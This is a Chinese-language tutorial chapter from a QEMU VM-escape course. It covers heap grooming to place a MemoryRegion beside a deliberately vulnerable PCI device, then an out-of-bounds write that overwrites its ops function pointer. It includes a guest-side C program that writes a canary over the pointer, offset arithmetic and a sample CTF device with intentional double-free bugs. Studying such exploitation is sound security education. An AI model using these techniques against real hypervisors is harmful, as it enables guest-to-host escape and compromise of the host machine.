# Ch 18 — device emulation 裡的 heap overflow

> **目標**：把 OOB write 升級為有意圖的 heap overflow——透過 heap grooming 讓帶有 function pointer 的 QEMU 物件落在 VulnState.buf 後方，再用精確的 OOB write 覆蓋那個 function pointer，準備好 Ch 20-21 的函式指標劫持。

> **環境**：QEMU 9.0 / x86-64 / Linux host（Ubuntu 22.04/24.04），自編帶 debug symbol 的 QEMU，已完成 Ch 17 的 infoleak（知道 PIE base 和 heap 地址）。

---

## 為什麼需要這個？

Ch 16 的 OOB write 能覆蓋 `buf` 後方的記憶體，但這件事本身沒有直接的控制流劫持能力——除非後方剛好有一個帶 function pointer 的物件，而且你知道要打到哪個 offset。

「哪個 offset 有 function pointer」這個問題的答案不是固定的：它取決於 QEMU 的 heap 佈局，而 heap 佈局取決於 QEMU 啟動後的分配順序。不同版本、不同啟動參數，佈局都會變。

Heap grooming（heap 整形）是讓你對 heap 佈局施加控制的技術：透過一系列精心安排的分配和釋放操作，把目標物件驅趕到你預期的位置。在 QEMU 逃逸場景裡，「guest 動作 → QEMU g_malloc 分配」這條因果關係給了你從 guest 端操控 host heap 佈局的能力。

這個概念和 `binary_exploitation` 的 heap grooming 完全相同——差別只在 `malloc` 換成 `g_malloc`，觸發分配的不是程式本身而是 guest 的 MMIO/DMA 操作。

---

## 先建立直覺

```
目標佈局（grooming 後）：
                                                     ← 我們要寫到這裡
  heap 低地址                               heap 高地址
  ┌──────────────────────┬──────────────────────────────────────────┐
  │  VulnState           │  target_object（含 function pointer）     │
  │  ┌────────────────┐  │  ┌──────────────────────────────────────┐│
  │  │ pdev           │  │  │  ...                                  ││
  │  │ mmio           │  │  │  .ops → vuln_mmio_ops（.rodata）      ││
  │  │ buf[0x100] ←───┼──┼──┼▶ OOB write 從這裡開始打             ││
  │  │ status         │  │  │  ...function_ptr → ??? ← 覆蓋目標    ││
  │  └────────────────┘  │  └──────────────────────────────────────┘│
  │                      │                                           │
  │  chunk header        │  chunk header                             │
  └──────────────────────┴──────────────────────────────────────────┘

grooming 成功的標誌：
  VulnState 後方的第一個或第二個 chunk 是帶有 function pointer 的物件
  從 buf[0x100] 開始的 OOB write 能精確打到那個指標欄位
```

目標物件的選擇很關鍵。什麼樣的 QEMU 物件「帶有 function pointer」？

1. **另一個 MemoryRegion**：`ops` 欄位是 `const MemoryRegionOps *`，指向 handler table。
2. **Timer（QEMUTimer）**：`cb` 欄位是一個 function pointer，時間到了 QEMU main loop 呼叫它。
3. **QOM 物件的 vtable（ObjectClass）**：有 `.realize`/`.unrealize` 等 function pointer。
4. **AIOContext 相關的 handler**：非同步 I/O callback。

本章以 **另一個 MemoryRegion 的 `.ops` 指標**為示範目標——因為這在 QEMU device CTF 題裡是最常見的案例，而且 Ch 20 會深入分析所有可劫持指標。

---

## Heap grooming 的原理：從 tcache 到 QEMU

在 `binary_exploitation` 裡你用過這個模式：

```
free chunk A（大小 N）
malloc chunk B（大小 N）→ B 拿到 A 的地址
```

glibc tcache（Thread Local Cache，glibc 2.26+）讓這個控制更容易：每個大小的 free chunk 存在一個 per-thread 單向鏈表，下次 malloc 同大小直接從 tcache 取頂部的 chunk。QEMU 是多執行緒的，但 device emulation 主要在 main thread 裡跑，tcache 行為和 binary exploitation 課裡說的幾乎相同。

QEMU 用 `g_malloc` 分配物件，其底層就是系統的 `malloc`（在 Linux 上即 glibc malloc）。Ch 14 已確認這一點——`g_malloc` 沒有自己的 allocator，堆疊 bypass 技術直接適用。

### Grooming 在 QEMU 的特殊性

觸發 `g_malloc` 的是 guest 的動作，不是你直接呼叫 `malloc`：

| Guest 動作 | Host QEMU 分配 |
|-----------|---------------|
| `echo 1 > /sys/bus/pci/devices/.../enable` | 可能觸發 device 的 realize callback，分配 VulnState |
| 對 BAR0 寫特殊命令（如果 device 支援） | device handler 分配暫存 buffer |
| 熱插拔另一個 device | QEMU 分配新的 device state |
| 調整 QEMU monitor 命令（qmp）| 各種 QEMU 內部物件分配 |

在 CTF 題裡，出題者通常設計一個「alloc」和「free」的 MMIO 命令讓你直接控制 heap 佈局。在真實 device bug 場景，你需要找哪些 guest 可觸發的 path 會讓 QEMU 做特定大小的 g_malloc。

---

## 目標物件：另一個 MemoryRegion 的 ops 指標

假設我們能讓 QEMU 在 VulnState 後方分配一個 `MemoryRegion`（大小約 176 bytes，QEMU 9.0 `sizeof(MemoryRegion)` 的近似值）。那個 MemoryRegion 的 `ops` 欄位儲存一個 `const MemoryRegionOps *`——如果我們把它覆蓋成一個偽造的 `MemoryRegionOps`，下次 QEMU 透過它呼叫 `.read` 或 `.write`，就跳到我們控制的地址。

```
VulnState heap chunk（概念大小 ~900 bytes = 0x384，實際用 pahole 量）：
  ┌────────────────────────────────┐ 0x??00 chunk header（16 bytes）
  │ prev_size = 0                  │
  │ size = 0x391（0x384 + header + PREV_INUSE bit）│
  ├────────────────────────────────┤ 0x??10 = malloc 返回值（VulnState 指標）
  │ PCIDevice pdev（~248 bytes）    │
  │ MemoryRegion mmio（~176 bytes） │
  │ char buf[0x100]                │ ← OOB write 起點（buf[0] 對應 MMIO offset 0x10）
  │ uint32_t status（4 bytes）      │
  ├────────────────────────────────┤ 0x?394 chunk header（鄰接 chunk）
  │ prev_size                      │ ← OOB write buf[0x100+] 先打到這
  │ size = 0xb1（MemoryRegion chunk）│ ← 打到這裡很危險（改壞 size 會崩潰）
  ├────────────────────────────────┤ 0x?3a4 = MemoryRegion 物件起點
  │ MemoryRegion.parent_obj        │ （Object，32 bytes）
  │ MemoryRegion.romd_mode (bool)  │
  │ ...                            │
  │ MemoryRegion.ops ←─────────────┼─ 覆蓋這個！（8 bytes，64-bit 指標）
  │ MemoryRegion.opaque            │
  │ ...                            │
  └────────────────────────────────┘
```

計算要打到 `ops` 欄位需要的 OOB write offset：

```
ops 的 host 地址 = VulnState_addr + sizeof(VulnState) + 16（chunk header）+ offsetof(MemoryRegion, ops)

OOB write 從 buf[0x100] 開始（MMIO offset 0x110）：
  buf[0x100] = *(VulnState_addr + offsetof(VulnState, buf) + 0x100)

write_offset_to_ops = (sizeof(VulnState) - offsetof(VulnState, buf) - 0x100)
                    + 16（chunk header）
                    + offsetof(MemoryRegion, ops)
```

> **未實測，理論預期**。上面所有 sizeof/offsetof 都需要在你的 QEMU build 上用 pahole 或 gdb `p sizeof(VulnState)` 實際量，不能直接套用這裡的估算。

---

## grooming 程式碼骨架

```c
/*
 * 未實測，理論預期。
 * 在 Ubuntu guest + 自編 QEMU host 上按驗證步驟測試。
 *
 * 驗證步驟：
 *   1. host: gdb -p $(pgrep qemu-system-x86)
 *   2. host: (gdb) watch *(uint64_t*)(target_mr_addr + ops_offset)
 *   3. guest: 執行此程式
 *   4. host: 確認 watchpoint 在 OOB write 後觸發，ops 值變成 0xdeadbeefdeadbeef
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

#define BAR0_SIZE   0x1000
#define REG_BUF_WR  0x10

static volatile uint8_t *bar0;

static void mmio_write8(uint64_t off, uint8_t val) {
    bar0[REG_BUF_WR + off] = val;
}

/* 覆蓋目標 offset 的 8-byte 指標 */
static void oob_write64(uint64_t oob_offset, uint64_t val) {
    for (int i = 0; i < 8; i++)
        mmio_write8(oob_offset + i, (val >> (i * 8)) & 0xff);
}

int main(void)
{
    int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0",
                  O_RDWR | O_SYNC);
    if (fd < 0) { perror("open"); return 1; }

    bar0 = mmap(NULL, BAR0_SIZE, PROT_READ | PROT_WRITE,
                MAP_SHARED, fd, 0);
    if (bar0 == MAP_FAILED) { perror("mmap"); return 1; }

    /*
     * Step 1: 觸發 grooming
     *
     * 在 CTF 題型 device 裡，出題者通常提供 alloc/free MMIO 命令：
     *   mmio_write32(REG_ALLOC, 0xb0)  → device 呼叫 g_malloc(0xb0)
     *
     * 在 vuln-pci 這個簡化的 device 上，我們用啟動另一個 device 或
     * 觸發 QEMU QMP 命令來產生 MemoryRegion 分配。
     *
     * 這裡用 system("qmp-command...") 是概念示意，真實環境需要
     * 透過 QEMU monitor socket 或 guest 端的 qmp client 發送命令。
     *
     * 目標：讓一個新的 MemoryRegion（~0xb0 bytes）分配在 VulnState 後方。
     */
    printf("[*] Step 1: Grooming heap (觸發鄰接 MemoryRegion 分配)...\n");
    /*
     * 概念示意：
     *   system("echo '{ \"execute\": \"device_add\", "
     *          "\"arguments\": { \"driver\": \"virtio-balloon-pci\" } }'"
     *          " | nc -q1 localhost 4444");
     * 實際需要根據 QEMU 啟動時的 QMP socket 路徑調整。
     */

    /*
     * Step 2: 用 Ch 17 的 infoleak 確認 grooming 成功
     * （鄰接 chunk 的 ops 欄位應指向某個 MemoryRegionOps）
     */
    printf("[*] Step 2: Verifying groomed layout via OOB read...\n");

    /*
     * Step 3: OOB write 覆蓋鄰接 MemoryRegion.ops
     *
     * write_offset = size_of_vuln_buf_tail + chunk_header + offsetof(MemoryRegion, ops)
     *
     * 以下所有數字是估算，必須用 pahole/gdb 確認：
     *   sizeof(VulnState) - offsetof(VulnState, buf) - 0x100 = 4 (status 的 4 bytes)
     *   chunk header = 16 bytes
     *   offsetof(MemoryRegion, ops) = 約 0x28（Object parent_obj 之後，需要 pahole 確認）
     *
     *   write_offset = 4 + 16 + 0x28 = 0x44
     *   MMIO write offset = REG_BUF_WR + 0x100 + 0x44 = 0x10 + 0x100 + 0x44 = 0x154
     */
    uint64_t WRITE_OFFSET_TO_OPS = 0x44; /* ← 未實測佔位符！用 pahole 確認 */

    /*
     * 假設 Ch 17 已洩漏 PIE base = 0x555555554000（示範值）
     * 偽造 ops 指標：指向我們控制的偽 MemoryRegionOps（需先佈置在已知地址）
     * 在 ROP 章（Ch 21-22）之前，先用一個明顯的 canary 值確認寫入成功
     */
    uint64_t CANARY = 0xdeadbeefdeadbeefULL;
    printf("[*] Step 3: OOB write target ops with canary 0x%016lx\n", CANARY);
    oob_write64(0x100 + WRITE_OFFSET_TO_OPS, CANARY);

    /*
     * Step 4: 驗證——觸發目標 MemoryRegion 的讀寫（讓 QEMU 呼叫被覆蓋的 ops）
     * 這會造成 QEMU crash（因為 0xdeadbeef... 不是有效地址），
     * 但 crash 本身證明了控制流已到達 ops->read/write。
     *
     * host gdb 應看到：
     *   Program received signal SIGSEGV, Segmentation fault.
     *   0xdeadbeefdeadbeef in ?? ()
     *   或：
     *   0x0000deadbeefdeadbeef 附近的 call [rax]
     */
    printf("[*] Step 4: Triggering target MemoryRegion ops (expect QEMU crash/SIGSEGV)...\n");
    printf("    在 host gdb 確認 PC = 0xdeadbeefdeadbeef 或 call 了 canary 值\n");

    munmap((void *)bar0, BAR0_SIZE);
    close(fd);
    return 0;
}
```

---

## 底層機制：glibc heap 佈局與 g_malloc 互動

```
QEMU 啟動時 heap 狀態（大幅簡化）：
  chunk 0: VulnState（realize 時分配）
  chunk 1: MemoryRegion name 字串（memory_region_init_io 內部分配）
  chunk 2: ... 其他 QEMU 物件 ...

正常情況下 VulnState 後面不一定是我們想要的物件。
Grooming 的目標：
  1. 用 free 操作把 VulnState 後方的 chunk 釋放
  2. 再 malloc 一個大小相同的含指標物件，它會佔據那個位置

在 CTF 題型 device 中，出題者通常設計：
  MMIO offset 0xXX → device 呼叫 g_malloc(N)，返回給 guest（guest 可觸發）
  MMIO offset 0xYY → device 呼叫 g_free(ptr)（guest 可觸發）

這給了你一個「從 guest 端操控 host heap 的介面」。

glibc tcache 行為（glibc 2.26+，QEMU host Ubuntu 22.04）：
  free chunk（大小 N）→ 進 tcache[N] 的頂部
  malloc（大小 N）→ 從 tcache[N] 頂部取
  
  所以：
    free(MemoryRegion_ptr)   → tcache[sizeof(MemoryRegion)] 頂 = MemoryRegion_ptr
    malloc(sizeof(MemoryRegion)) → 拿到 MemoryRegion_ptr 這塊記憶體
    填入我們控制的資料（含偽 ops）→ 把這塊記憶體變成惡意物件
    
    或者：
    讓 QEMU 自己分配一個帶真實 ops 的 MemoryRegion，佈置在 VulnState 後方
    用 OOB write 只覆蓋 ops 指標（細粒度覆蓋），保留其他欄位完整
```

**細粒度 OOB write vs 粗暴 memset**

實際 exploit 中，只覆蓋 ops 指標（8 bytes），而不是用 memset 把整個鄰接 chunk 寫爛——後者幾乎必然損壞 chunk header 或其他重要欄位，QEMU 下次 free/malloc 時崩潰。細粒度覆蓋的要求是：知道精確的 offset。這就是 Ch 17 infoleak 的前置意義，也是為何 leak 在 overflow 之前。

---

## 對比與取捨

| 方案 | 操作 | 穩定性 | 適用場景 |
|------|------|--------|---------|
| 覆蓋 MemoryRegion.ops | OOB write 8 bytes | 高（只改一個指標） | 鄰接有 MemoryRegion 的情況 |
| 覆蓋 QEMUTimer.cb | OOB write 8 bytes + 等 timer 觸發 | 中（需要 timer 在正確時間跑） | 鄰接有 QEMUTimer 的情況 |
| 偽造整個 MemoryRegion | OOB write ~176 bytes | 低（容易打壞 chunk header） | 只在 chunk header 之前有足夠空間時 |
| 覆蓋 function pointer table（vtable） | OOB write 8 bytes | 高 | QOM 物件落在後方時 |

最穩的做法是覆蓋最靠近 OOB 起點的 function pointer，減少需要打穿的距離（減少碰壞 chunk header 的風險）。

---

## 踩雷集錦

**雷 1：打到 chunk header 讓 glibc 爆炸**

直覺：OOB write 會連續覆蓋記憶體，只要最終打到 ops 就好。
實際：glibc malloc 的 chunk header（`size` 欄位）是安全機制的一部分。如果你把 `size` 欄位改成亂值，下次 QEMU `free` 任何 chunk 時，glibc 可能觸發 `malloc: corrupted top size` 或 `double free or corruption` 的 abort。**必須跳過或保留 chunk header**，只覆蓋 chunk data 區域。正確做法：在 OOB write 序列中，把 chunk header 的 16 bytes 保留原值不變。

**雷 2：grooming 的大小必須精確匹配**

直覺：「分配一個物件」就行，大小差不多就好。
實際：tcache 按 chunk 大小索引（以 16-byte 為單位對齊）。如果你的 grooming 分配的大小和 VulnState 後方空閒 chunk 的大小不匹配，glibc 不會把它放到你期望的位置。必須用 pahole 確認目標物件的大小，再確保 grooming 分配的大小相同。

**雷 3：VulnState 後方的物件因 QEMU 非同步操作而變化**

直覺：grooming 完成後，佈局就固定了。
實際：QEMU 的 main loop 是 single-threaded event loop，但中斷、timer、非同步 I/O 都可能在你觸發 OOB 的間隙插入，觸發額外的 g_malloc/g_free，把精心佈置的 heap layout 打亂。解法：把整個 grooming → infoleak → overflow 的序列壓縮到最短的時間窗口內，減少被非同步操作干擾的機會。

**雷 4：ops 欄位是 const 指標，改了之後 const 保護會阻擋？**

直覺：`const MemoryRegionOps *ops` 的 `const` 會防止寫入。
實際：`const` 是 C 語言的靜態類型約束，由編譯器在編譯時檢查。在執行時，記憶體只看讀寫權限（r/w bit），不看 `const`。我們是用 OOB write 直接對 host 記憶體某個地址寫值，繞過了 C 的類型系統。只要那塊記憶體的 mmap 權限是可寫的（heap 是 rw，沒有 const 限制），就能覆蓋。

**雷 5：fake ops 物件本身也要是可讀的地址**

直覺：把 ops 改成任意值，QEMU 就會跳過去。
實際：QEMU 呼叫 ops 前，可能先 dereference ops 指標讀出 `.read`/`.write` 函式指標（`ops->read`），如果 ops 指向的地址不可讀，先一步 SIGSEGV。確保 fake ops 指向一塊可讀且格式正確的記憶體（Ch 21 偽造物件章節會深入這個問題）。在本章的 canary 測試階段，用 `0xdeadbeefdeadbeef` 確認到達 call 指令就夠了，不需要 fake ops 真的可讀。

---

## 進階：再往深一層

### 利用 QEMU 自己的 alloc/free 路徑做 grooming

在真實的 CTF 題型 device（不同於教學用 vuln-pci）中，出題者通常設計：

```
/* 示意：CTF 題型 device 的 MMIO 設計 */
#define REG_ALLOC    0x100   /* 寫入 size → g_malloc(size) */
#define REG_FREE     0x104   /* 寫入 index → g_free(buf_pool[index]) */
#define REG_WRITE    0x108   /* 寫入 buf_pool[cur] 的資料 */

static void ctf_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned sz) {
    CtfState *s = opaque;
    switch (addr) {
        case REG_ALLOC:
            s->buf_pool[s->pool_idx++] = g_malloc(val);  /* BUG: 無大小上限 */
            break;
        case REG_FREE:
            g_free(s->buf_pool[val]);                    /* BUG: 可能 double free */
            break;
    }
}
```

這類 device 給了 guest 完整的 heap primitive（alloc N bytes、free index、write data），grooming 變得非常直接：你可以精確控制哪個大小的 chunk 出現在哪個位置。

vuln-pci 沒有這麼完整的介面，所以本章需要借助 QEMU 內部的其他分配（如熱插拔 device 觸發的 realize）。實際 CTF 比賽中遇到 vuln device，一定要先找清楚 alloc/free MMIO 介面在哪。

### `tcache_perthread_struct` 和 GLIBC_2.34 以後的 safe-linking

glibc 2.32 引入了 safe-linking：tcache 的 fd 指標被 `PROTECT_PTR` 加密（`fd ^= (ptr >> 12)`），讓簡單的 tcache poisoning 更難直接利用。在 Ubuntu 22.04（glibc 2.35）上的 QEMU，堆 exploit 需要注意這點。本課的攻擊目標不是 tcache fd（我們是 OOB write 到已分配的 chunk 的 data 欄位，不需要改 tcache fd），所以 safe-linking 對本章的手法沒有直接影響。但如果你想用 tcache poisoning 把某個 chunk 的 fd 改成偽 chunk 的地址，就需要先洩漏 heap base（Ch 17 已完成），才能算出正確的 XOR 值。

---

## 動手練習

1. **量結構大小**：在 host 用 `pahole -C VulnState ./qemu-system-x86_64` 取得 VulnState 的精確大小和各欄位 offset。記下 `buf` 的 offset 和 VulnState 總大小。再用 `pahole -C MemoryRegion ./qemu-system-x86_64` 取得 `ops` 欄位的 offset。

2. **計算 OOB write 距離**：根據上面的數字，計算從 `buf[0x100]`（OOB 起點）到鄰接 MemoryRegion chunk 裡 `ops` 欄位的 byte 距離。注意扣除 chunk header（16 bytes）必須跳過或保留。

3. **grooming 測試**：設計一個 grooming 序列——在 guest 端觸發一個已知大小的 QEMU 分配（例如，掛載一個已知 device state size 的 device），用 host gdb 確認它確實在 VulnState 後方。

4. **canary OOB write**：執行本章的 canary 程式，在 host gdb 觀察：(a) `ops` 欄位確實被覆蓋成 `0xdeadbeefdeadbeef`；(b) 觸發該 MemoryRegion 的 MMIO 讀寫時，QEMU 在 `call` 指令處 crash，PC = 或接近 `0xdeadbeefdeadbeef`。

5. **不要 crash chunk header**：在 canary OOB write 序列中，插入讀回並確認 chunk header 的步驟——確認 `prev_size` 和 `size` 欄位未被改動。

---

## 本章重點整理

- Heap grooming 讓你對 host QEMU 的 heap 佈局施加控制，把帶有 function pointer 的物件驅趕到 OOB 可打的位置。
- `g_malloc` 底層就是 glibc malloc，所有 `binary_exploitation` 的 tcache 佈局技術都適用。
- 最佳的 OOB write 目標是 **MemoryRegion.ops**（指向 handler table，覆蓋後下次 MMIO 觸發時跳到偽地址）或 **QEMUTimer.cb**。
- **不能打到 chunk header**：glibc malloc 的 size 欄位如果被改壞，下次 free 時立刻 abort。
- Grooming 需要大小精確匹配（tcache 按大小索引）——用 pahole 量，不要猜。
- Canary 測試（寫 `0xdeadbeefdeadbeef` 再觸發）是確認「OOB write 已控制 function pointer 欄位」的標準驗證手段。
- glibc 2.32+ 的 safe-linking 對本章的 data-area OOB write 沒有直接影響，但在更進階的 tcache 手法時需要注意。

---

## 自我檢核

- [ ] 解釋「heap grooming」在 QEMU 逃逸情境下的具體意義（誰觸發分配？怎麼讓目標物件落在 VulnState 後方？）
- [ ] 說出為何覆蓋 chunk header 的 size 欄位會讓 exploit 在下次 free 時崩潰
- [ ] 計算：如果 sizeof(VulnState)=0x390，sizeof(MemoryRegion)=0xb0，offsetof(MemoryRegion, ops)=0x28，VulnState.buf 在 offset 0x1a8，那麼 OOB write 到 ops 的 offset 是多少（從 buf[0x100] 算起，注意 chunk header 16 bytes）？
- [ ] 說明為什麼 fine-grained OOB write（只改 8 bytes）比大範圍覆蓋更安全
- [ ] 解釋 glibc safe-linking 是什麼，以及它對本章手法的影響

---

## 延伸閱讀

1. **「glibc malloc internals」—Azeria Labs**（[azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)）
   - 讀哪裡：tcache、chunk header、bins 的內部結構說明。
   - 學什麼：為何 tcache 讓 grooming 更容易控制；chunk header 的 size bit 的語義。
   - 關聯：本章的 grooming 假設依賴 tcache 行為；不懂 tcache 就不懂為什麼大小要精確匹配。

2. **「vm-escape：QEMU Case Study」—Cjm00 @ GitHub**（搜尋 `cjm00 qemu escape github`）
   - 讀哪裡：heap grooming 和 OOB write 的具體步驟，以及 ops 覆蓋的 C 示例程式碼。
   - 學什麼：一個完整且相對簡短的 QEMU custom device heap overflow 案例，比本章更接近真實 CTF 題型。
   - 關聯：這正是本章手法的真實對照，看完後你的整個 mental model 會更清晰。

3. **QEMU `include/exec/memory.h` 中 MemoryRegionOps 的完整定義**（[GitLab](https://gitlab.com/qemu-project/qemu/-/blob/stable-9.0/include/exec/memory.h)）
   - 讀哪裡：`struct MemoryRegionOps` 的所有欄位，以及 `struct MemoryRegion` 的 ops 欄位在哪。
   - 學什麼：覆蓋 `ops` 後 QEMU 呼叫哪個欄位（`.read`/`.write`），偽造的 ops 需要在什麼 offset 放函式指標。
   - 關聯：Ch 20 `hijackable-pointers` 會深入所有可劫持的欄位，本章是前導。

4. **「how2heap」—shellphish**（[github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)）
   - 讀哪裡：`tcache_poisoning.c`、`house_of_lore.c`、`unsafe_unlink.c`。
   - 學什麼：glibc heap exploit 的各種原語；tchache 如何被利用；這些技術在 g_malloc = glibc malloc 的 QEMU 上完全適用。
   - 關聯：`binary_exploitation` 課已用過 how2heap，這裡是「在 QEMU 場景下重新理解它」。

5. **「safe-linking」glibc commit + LWN 分析**（搜尋 `glibc safe linking 2020 LWN`）
   - 讀哪裡：LWN.net 的 safe-linking 介紹文，以及 glibc 2.32 對應 commit 的 diff。
   - 學什麼：safe-linking 的 XOR 保護是什麼、如何繞過（需要 heap leak）；在 Ubuntu 22.04 的 QEMU 上是否生效。
   - 關聯：雖然本章的手法不需要改 tcache fd，但進階 heap exploit 需要了解這個保護。

---

> 你現在知道如何用 heap grooming 把一個帶 function pointer 的物件放到 VulnState 後方，並用精確的 OOB write 覆蓋那個指標。但「覆蓋」只是第一步——被覆蓋的指標要指向哪裡、怎麼偽造一個有效的 ops 結構讓 QEMU 不崩潰直到你想要的時刻、以及如何在那個時刻跳進 ROP 鏈，是 Ch 20-21 的任務。在那之前，我們先處理另一個完全不同的漏洞類型：UAF。

→ [Ch 19 — UAF：hot-unplug 與狀態機錯誤](./19-uaf-hot-unplug.md)
